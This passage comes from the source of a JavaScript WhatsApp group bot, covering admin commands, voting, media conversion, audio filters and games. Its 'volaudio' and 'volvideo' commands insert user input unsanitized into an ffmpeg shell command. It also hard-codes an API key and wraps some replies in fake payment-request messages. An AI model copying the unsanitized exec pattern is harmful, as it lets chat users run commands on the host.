    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let promote of deepakpromoteall) {
 await DeepakBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
 await sleep(100);
 }
 replygcdeepak(`Success`);
}
break
case 'demoteall': {
 if (!m.isGroup) return DeepakStickGroup()
 if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
 if (!isBotAdmins) return DeepakStickBotAdmin()
  const deepakdemoteal = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let demote of deepakdemoteal) {
 await DeepakBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
 await sleep(100);
 }
 replygcdeepak(`Success`);
}
break
            case 'hidetag':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                DeepakBotInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'totag':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                if (!isAdmins) return replygcdeepak(mess.admin)
                if (!m.quoted) return replygcdeepak(`Reply media with caption ${prefix + command}`)
                DeepakBotInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
            break
            case 'group':
            case 'grup':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                if (args[0] === 'close') {
                    await DeepakBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcdeepak(`Success Closing Group`))
                } else if (args[0] === 'open') {
                    await DeepakBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcdeepak(`Success Opening Group`))
                } else {
                    replygcdeepak(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`)
                }
            break
            case 'editinfo':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                if (args[0] === 'open') {
                    await DeepakBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcdeepak(`Successfully Opened Edit Group Info`))
                } else if (args[0] === 'close') {
                    await DeepakBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcdeepak(`Successfully Closed Edit Group Info`))
                } else {
                    replygcdeepak(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
            break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                let response = await DeepakBotInc.groupInviteCode(m.chat)
                DeepakBotInc.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
            break
            case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await DeepakBotInc.fetchStatus(who)
    replygcdeepak(bio.status)
  } catch {
    if (text) return replygcdeepak(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await DeepakBotInc.fetchStatus(who)
      replygcdeepak(bio.status)
    } catch {
      return replygcdeepak(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
        break
        case 'vote': {
            if (!m.isGroup) return DeepakStickGroup()
            if (m.chat in vote) return replygcdeepak(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return replygcdeepak(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            replygcdeepak(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
┋⍟┃ 
├ Total: ${vote[m.chat][1].length}
┋⍟┃
┋⍟┃ 
└────

┌〔 DOWNVOTE 〕
┋⍟┃ 
├ Total: ${vote[m.chat][2].length}
┋⍟┃
┋⍟┃ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            DeepakBotInc.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return DeepakStickGroup()
            if (!(m.chat in vote)) return replygcdeepak(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcdeepak('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
┋⍟┃ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
┋⍟┃ 
└────

┌〔 DOWNVOTE 〕
┋⍟┃ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
┋⍟┃ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            DeepakBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return DeepakStickGroup()
            if (!(m.chat in vote)) return replygcdeepak(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcdeepak('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
┋⍟┃ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
┋⍟┃ 
└────

┌〔 DOWNVOTE 〕
┋⍟┃ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
┋⍟┃ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            DeepakBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return DeepakStickGroup()
if (!(m.chat in vote)) return replygcdeepak(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
┋⍟┃ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
┋⍟┃ 
└────

┌〔 DOWNVOTE 〕
┋⍟┃ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
┋⍟┃ 
└────

*${prefix}deletevote* - to delete votes


©${DeepakBotInc.user.id}
`
DeepakBotInc.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return DeepakStickGroup()
            if (!(m.chat in vote)) return replygcdeepak(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replygcdeepak('Successfully Deleted Vote Session In This Group')
	    }
            break
break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                await DeepakBotInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcdeepak(`Reset Success`)
                    })
            break
                //bot status
            case 'ping': case 'botstatus': case 'statusbot': case 'p': {
	const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
	DeepakBotInc.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 999999999,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: respon,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, {})
    }
	
	break
	case 'repo': case 'repository': {
  try {
    const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `
${themeemoji} Repository Name: ${repoData.name}
${themeemoji} Description: ${repoData.description}
${themeemoji} Owner: ${repoData.owner.login}
${themeemoji} Stars: ${repoData.stargazers_count}
${themeemoji} Forks: ${repoData.forks_count}
${themeemoji} URL: ${repoData.html_url}
     
 `.trim()
      await DeepakBotInc.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 69000,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: formattedInfo,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, {})
    } else {
      await replygcdeepak(`Unable to fetch repository information`)
    }
  } catch (error) {
    console.error(error)
    await replygcdeepak(`Repository currently not available `)
  }
}
break
            case 'buypremium':
            case 'premiumuser': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium?Just chat with the owner😉`
                await DeepakBotInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'rentbot':
                replygcdeepak(`Type ${prefix}owner and chat him`)
                break
            case 'speedtest': {
                replygcdeepak('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python speed.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) DeepakBotInc.sendMessage(m.chat, {
                        text: stdout,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                    if (stderr.trim()) DeepakBotInc.sendMessage(m.chat, {
                        text: stderr,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'runtime':
                let pinga = `Bots Have Been Running For ${runtime(process.uptime())}`
                DeepakBotInc.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
break
            case 'owner': {
                DeepakBotInc.sendMessage(from, {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list
                    }, contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                }, {
                    quoted: m
                })
            }
            break
            //convert
case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcdeepak(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await DeepakBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcdeepak('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await DeepakBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygcdeepak(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
            case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygcdeepak(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
DeepakBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
DeepakBotInc.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await DeepakBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcdeepak('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await DeepakBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcdeepak(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replygcdeepak(`Reply sticker with caption *${prefix + command}*`)
                await DeepakStickWait()
                let media = await DeepakBotInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    DeepakBotInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replygcdeepak(`Reply sticker with caption *${prefix + command}*`)
                await DeepakStickWait()
                let media = await DeepakBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await DeepakBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcdeepak(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
                await DeepakStickWait()
                let media = await DeepakBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                DeepakBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcdeepak(`Send/Reply Video/Audio that you want to make into MP3 with captions ${prefix + command}`)
                await DeepakStickWait()
                let media = await DeepakBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                DeepakBotInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `DGDEEPAK.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcdeepak(`Send/Reply Video/Audio that you want to make into a VN with captions ${prefix + command}`)
                await DeepakStickWait()
                let media = await DeepakBotInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                DeepakBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replygcdeepak(`Reply sticker with caption *${prefix + command}*`)
                await DeepakStickWait()
                let media = await DeepakBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await DeepakBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                await DeepakStickWait()
                let media = await DeepakBotInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replygcdeepak(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replygcdeepak(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcdeepak(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcdeepak(`Example : ${prefix + command} 😅+🤔`)
                await DeepakStickWait()
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await DeepakBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'emojimix2': {
                if (!text) return replygcdeepak(`Example : ${prefix + command} 😅`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                for (let res of anu.results) {
                    let encmedia = await DeepakBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replygcdeepak(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
                    DeepakBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
                    DeepakBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
                   DeepakBotInc.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replygcdeepak(`Example:\n${prefix}fliptext DGDEEPAK`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcdeepak(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'toqr':{
  if (!q) return replygcdeepak(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await DeepakBotInc.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'volaudio': {
if (!args.join(" ")) return replygcdeepak(`Example: ${prefix + command} 10`)
media = await DeepakBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcdeepak('Error!')
jadie = fs.readFileSync(rname)
DeepakBotInc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return replygcdeepak(`Example: ${prefix + command} 10`)
media = await DeepakBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcdeepak('Error!')
jadie = fs.readFileSync(rname)
DeepakBotInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
  case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await DeepakStickWait()
                let media = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygcdeepak(err)
                let buff = fs.readFileSync(ran)
                DeepakBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcdeepak(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcdeepak(e)
                }
                break
                //media db
  case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n┋⍟┃\n'
for (let x of bad) {
teks += `┋⍟┃⭔ ${x}\n`
}
teks += `┋⍟┃\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
replygcdeepak(teks)
}
break

            //game
            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
                let TicTacToe = require("./lib/tictactoe")
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygcdeepak('You are still in the game')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    replygcdeepak('Partner not found!')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Turn @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`
                    if (room.x !== room.o) await DeepakBotInc.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await DeepakBotInc.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    replygcdeepak('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
                    this.game[room.id] = room
                }
            }
            break
            case 'delttc':
            case 'delttt': {
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        DeepakBotInc.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
                    } else if (!this.game) {
                        replygcdeepak(`Session TicTacToe🎮 tidak ada`)
                    } else replygcdeepak('?')
                } catch (e) {
                    replygcdeepak('rusak')
                }
            }
            break
            case 'suitpvp':
            case 'suit': {
                this.suit = this.suit ? this.suit : {}
                let poin = 10
                let poin_lose = 10
                let timeout = 60000
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcdeepak(`Finish your previous suit`)
                if (m.mentionedJid[0] === m.sender) return replygcdeepak(`Can't play with myself !`)
                if (!m.mentionedJid[0]) return replygcdeepak(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, {
                    mentions: [owner[1] + '@s.whatsapp.net']
                })
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcdeepak(`The person you are challenging is playing suit with someone else :(`)
                let id = 'suit_' + new Date() * 1
                let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} challenged @${m.mentionedJid[0].split`@`[0]} to play suits

@${m.mentionedJid[0].split`@`[0]}Please type accept/reject, accept to accept or reject to reject the challenge`
                this.suit[id] = {
                    chat: await DeepakBotInc.sendText(m.chat, caption, m, {
                        mentions: parseMention(caption)
                    }),
                    id: id,
                    p: m.sender,
                    p2: m.mentionedJid[0],
                    status: 'wait',
                    waktu: setTimeout(() => {
                        if (this.suit[id]) DeepakBotInc.sendText(m.chat, `_Suit time is up_`, m)
                        delete this.suit[id]
                    }, 60000),
                    poin,
                    poin_lose,
